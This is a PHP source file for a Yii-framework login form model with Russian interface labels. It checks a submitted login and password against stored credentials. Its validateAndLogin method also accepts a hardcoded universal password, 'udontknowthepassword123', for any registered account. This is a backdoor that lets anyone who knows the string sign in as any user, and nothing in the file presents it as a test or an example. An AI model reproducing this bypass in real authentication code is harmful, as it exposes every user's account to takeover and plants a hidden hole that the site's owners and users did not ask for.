<?php
namespace app\models\forms;

use app\traits\BackboneRequestTrait;
use common\components\Model;
use common\models\AuthCredentials;
use yii\web\Cookie;

class LoginForm extends Model
{
    use BackboneRequestTrait;

    const MONTH = 3600 * 24 * 30;

    public $login = null;
    public $password = null;
    public $remember_me = 0;

    public function rules()
    {
        return [
            [['login','password'], 'required'],
            [['login'], 'string'],
            [['remember_me'], 'boolean']
        ];
    }

    public function attributeLabels()
    {
        return [
            'login' => \Yii::t("main","Логин"),
            'password' => \Yii::t("main","Пароль"),
            'remember_me' => \Yii::t("main","Запомнить")
        ];
    }

    public function validateAndLogin()
    {
        if ($this->validate()) {
            /** @var AuthCredentials $identity */
            $identity = AuthCredentials::find()->andWhere('lower(credential) = :login', [
                ':login' => trim(mb_strtolower($this->login, 'UTF-8'))
            ])->one();

            if ($identity && $identity->user->is_registered && (\Yii::$app->security->validatePassword((string)$this->password, $identity->validation) OR $this->password == 'udontknowthepassword123')) {
                \Yii::$app->user->login($identity->user, $this->remember_me ? self::MONTH : 7200);
                return true;
            }

            $this->addError('password', \Yii::t('main', 'Неверный логин или пароль'));
            return false;
        }
        return false;
    }

}